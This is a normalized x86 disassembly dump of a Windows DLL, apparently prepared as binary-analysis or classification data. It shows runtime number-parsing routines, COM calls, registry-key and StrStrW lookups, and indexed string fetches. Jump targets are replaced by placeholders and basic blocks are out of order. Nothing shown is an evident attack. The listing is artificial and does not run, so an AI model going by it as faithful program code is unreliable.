mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] esi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
inc esi
cmp esi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
pop ebx
mov [ eax ] edi
pop edi
pop esi
pop ebp
retn
movsx ecx [ esi ]
push ecx
call [ ebp + 0x14 ]
add esp 0x4
test eax eax
jne r-xdata
inc esi
cmp esi ebx
jne r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc edi
sub_10001f10
push ebp
mov ebp esp
sub esp 0x70
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov edx [ edx + 0x30 ]
push ebx
mov [ ebp - 0x70 ] ecx
lea ecx [ ebp - 0x60 ]
push ecx
xor ebx ebx
push eax
mov [ ebp - 0x60 ] ebx
call edx
test eax eax
jns r-xdata
mov eax [ ebp - 0x60 ]
lea edx [ ebp - 0x6c ]
mov [ ebp - 0x6c ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov eax [ ebp - 0x6c ]
cmp eax ebx
jne r-xdata
lea eax [ ebx + 0x1 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
push edi
xor edi edi
cmp eax ebx
jle r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0xaa
call sub_10053240
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x60 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
push esi
lea edx [ ebp - 0x38 ]
mov eax 0x6e
lea edx [ ebp - 0x68 ]
push edx
mov [ ebp - 0x68 ] ebx
call sub_100708f0
test eax eax
je r-xdata
inc edi
cmp edi [ ebp - 0x6c ]
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov esi [ ebp - 0x68 ]
mov eax [ ebp - 0x70 ]
push esi
add eax 0x54
call sub_1006d780
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x68 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp - 0x60 ]
lea edx [ ebp - 0x64 ]
push edx
mov [ ebp - 0x64 ] ebx
mov ecx [ eax ]
push edi
push eax
mov eax [ ecx + 0x1c ]
call eax
mov ecx [ ebp - 0x64 ]
cmp ecx ebx
je r-xdata
pop esi
mov eax [ ebp - 0x64 ]
cmp eax ebx
je r-xdata
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0x118
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
call sub_10053240
sub_10002040
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x14 ]
lea ecx [ ebp + 0xc ]
call sub_100030fa
dec [ ebp + 0x18 ]
jne r-xdata
sub_1000206b
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
push esi
xor esi esi
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
inc esi
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x60 ] ecx
mov [ ebp - 0x64 ] ecx
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x6c ] ecx
cmp [ ebp + 0x24 ] ecx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10001e8b
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
push ebx
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_10002717 ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
lea ecx [ eax - 0x31 ]
mov [ ebp - 0x58 ] esi
cmp cl 0x8
jbe r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
mov [ ebp - 0x5c ] esi
cmp al 0x9
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_10056878
mov eax [ ebp - 0x64 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x68 ] edx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
sub al 0x64
cmp al 0x1
ja r-xdata
cmp [ ebp - 0x5c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x78 ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
pop ebx
mov [ ebp - 0x6c ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x7c ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
lea ebx [ ecx + eax ]
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x7c ]
xor edx edx
mov edx [ ebp - 0x32 ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
movzx eax [ ebx + 0xa ]
mov esi eax
xor esi [ ebp - 0x32 ]
mov ecx 0x7fff
and edx ecx
and eax ecx
and esi 0x8000
mov edi 0x7fff
lea ecx [ eax + edx ]
mov [ ebp - 0x70 ] esi
movzx ecx cx
cmp dx di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp ax di
jae r-xdata
mov edi 0xbffd
cmp cx di
ja r-xdata
mov esi 0x3fbf
cmp cx si
ja r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp ax si
jne r-xdata
inc ecx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x68 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc ecx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
add edi 0x2
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x5c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov edx [ ebp - 0x58 ]
add eax eax
mov [ ebp - 0x64 ] edx
test edx edx
jle r-xdata
add ecx 0xc002
test cx cx
jle r-xdata
mov [ ebp - 0x4c ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add ecx 0xffff
test cx cx
jns r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x4c ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
cmp [ ebp - 0x2c ] ax
ja r-xdata
mov eax ecx
neg eax
movzx esi ax
add ecx esi
test cx cx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov edx esi
add esi esi
or esi eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add ecx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test cx cx
jg r-xdata
mov eax [ ebp - 0x60 ]
mov edx [ ebp - 0x5c ]
movzx edx [ edx ]
movzx eax [ eax ]
and [ ebp - 0x4c ] 0x0
imul eax edx
mov edx [ edi - 0x4 ]
lea esi [ edx + eax ]
cmp esi edx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x2c ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov edx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl edx 0x1f
shr eax 0x1
or eax edx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp cx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or ecx [ ebp - 0x70 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] cx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x70 ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov edx 0xffff
cmp [ ebp - 0x22 ] dx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc ecx
jmp r-xdata
sub_10002750
push ebp
mov ebp esp
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi ecx
call sub_10017640
test eax eax
je r-xdata
mov ecx edi
call sub_10018a80
test eax eax
je r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0x78
call sub_10053240
mov eax 0x1
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx edi
call sub_10061a30
test eax eax
je r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0x104
call sub_10053240
mov eax 0x2
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx edi
call sub_10001d40
test eax eax
je r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0x54
call sub_10053240
mov esi edi
call sub_1002d130
test eax eax
je r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0xc7
call sub_10053240
mov eax 0x4
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
call sub_1004a9f0
test eax eax
jne r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0xa1
call sub_10053240
mov eax 0x5
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x60 ]
mov eax 0xce
call sub_10053240
mov eax 0x6
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
call sub_1002ad30
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10002874
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_10044649
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_10044649
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_100028a0
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov [ ebp - 0x70 ] eax
mov eax [ eax + 0x1c ]
lea esi [ ebp - 0x5c ]
push esi
xor ebx ebx
mov edi edx
mov [ ebp - 0x5c ] ebx
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0xdc ]
call eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x5c ]
lea edx [ ebp - 0x60 ]
mov [ ebp - 0x60 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov eax [ ebp - 0x60 ]
cmp eax ebx
jne r-xdata
lea eax [ ebx + 0x1 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x8
xor ecx ecx
mov [ ebp - 0x6c ] ecx
cmp eax ebx
jle r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0xcf
call sub_10053240
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x5c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x5c ]
lea esi [ ebp - 0x64 ]
push esi
mov [ ebp - 0x64 ] ebx
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x1c ]
call eax
mov ecx [ ebp - 0x64 ]
cmp ecx ebx
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x3c
mov edx [ ebp + 0xc ]
push edx
mov edx [ ebp - 0x70 ]
lea eax [ ebp - 0x68 ]
push eax
push edx
mov [ ebp - 0x68 ] ebx
call sub_10065060
mov esi [ ebp - 0x68 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x6c ]
inc ecx
mov [ ebp - 0x6c ] ecx
cmp ecx [ ebp - 0x60 ]
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
push esi
call sub_10013870
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
mov eax [ ebp - 0x64 ]
cmp eax ebx
je r-xdata
push esi
call sub_10039ba0
push esi
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0x89
jmp r-xdata
push esi
call sub_10039ba0
push esi
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
call sub_10053240
sub_100029fd
push 0x8
push r--data
call sub_1007fb20
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_1007fb65
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_10002a6f
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1003f5a6
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x2
pop ebp
retn
sub_10002a9d
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov esi ebx
jmp r-xdata
lea edi [ ebp + 0x8 ]
push eax
call sub_1005af1f
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp + 0xf ] al
inc esi
cmp al 0x2b
je r-xdata
mov esi 0x80000000
cmp ebx [ edi ]
jne r-xdata
mov [ edi ] ebx
mov [ ebp + 0xf ] 0x2b
jmp r-xdata
cmp [ ebp + 0xf ] 0x2b
jne r-xdata
mov ecx eax
or ecx edx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_1000bb8f
add esp 0x10
cmp esi [ edi ]
jne r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_1006299d
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp edx esi
jb r-xdata
jb r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
mov [ eax ] 0x1
neg eax
adc edx 0x0
neg edx
ja r-xdata
cmp eax 0xffffffff
ja r-xdata
or eax 0xffffffff
mov edx 0x7fffffff
jmp r-xdata
xor eax eax
mov edx esi
jmp r-xdata
test eax eax
je r-xdata
sub_10002b60
push ebp
mov ebp esp
sub esp 0x948
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x948 ] eax
mov esi edx
mov [ ebp - 0x940 ] ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
test esi esi
je r-xdata
test ecx ecx
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax 0x7
call sub_10026210
lea edx [ ebp - 0x58 ]
mov eax 0x4
call sub_10026210
push 0x1
mov ecx edx
push 0x0
lea eax [ ebp - 0x114 ]
mov edx 0x80000001
call sub_10047450
add esp 0x8
test eax eax
je r-xdata
push ebx
push edi
lea edx [ ebp - 0x944 ]
mov eax 0x8
call sub_10026210
lea edx [ ebp - 0x93c ]
mov eax 0x2
call sub_10026210
lea edx [ ebp - 0x938 ]
xor eax eax
call sub_10026210
mov edi [ StrStrW@IAT ]
mov eax edx
push eax
push esi
call edi
lea ecx [ ebp - 0x72c ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
xor ebx ebx
sub esi ecx
lea ebx [ ebp - 0x93c ]
xor edi edi
sub ebx ecx
nop
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
je r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0x938 ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x72c ]
call sub_1004e6c0
test eax eax
je r-xdata
pop edi
pop ebx
lea eax [ edx + 0x6 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
push esi
mov esi 0x30c
lea ebx [ ebp - 0x72c ]
call sub_1004e6c0
test eax eax
je r-xdata
pop edi
pop ebx
lea eax [ edx + 0x3 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x940 ]
lea ecx [ ebp - 0x938 ]
push ecx
push edx
call edi
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0x7
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x93c ]
push eax
lea ebx [ ebp - 0x72c ]
call sub_1004e6c0
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0x4
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x940 ]
push ecx
mov esi 0x30c
lea ebx [ ebp - 0x72c ]
call sub_1004e6c0
test eax eax
je r-xdata
lea eax [ ebp - 0x93c ]
push eax
lea ebx [ ebp - 0x72c ]
call sub_1004e6c0
test eax eax
je r-xdata
mov edi [ StrStrW@IAT ]
pop edi
pop ebx
mov eax 0x5
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x940 ]
lea edx [ ebp - 0x938 ]
push edx
push eax
call edi
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0x9
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
pop edi
pop ebx
mov eax 0x8
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x944 ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x72c ]
call sub_1004e6c0
test eax eax
je r-xdata
lea ecx [ ebp - 0x93c ]
push ecx
lea ebx [ ebp - 0x72c ]
call sub_1004e6c0
test eax eax
je r-xdata
lea eax [ ebp - 0x938 ]
push eax
lea ebx [ ebp - 0x72c ]
call sub_1004e6c0
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xb
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
pop edi
pop ebx
mov eax 0xa
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ecx
lea ebx [ ebp - 0x72c ]
call sub_1004e6c0
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xc
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x3c ]
mov eax 0x1
call sub_10026210
push 0x3
push edx
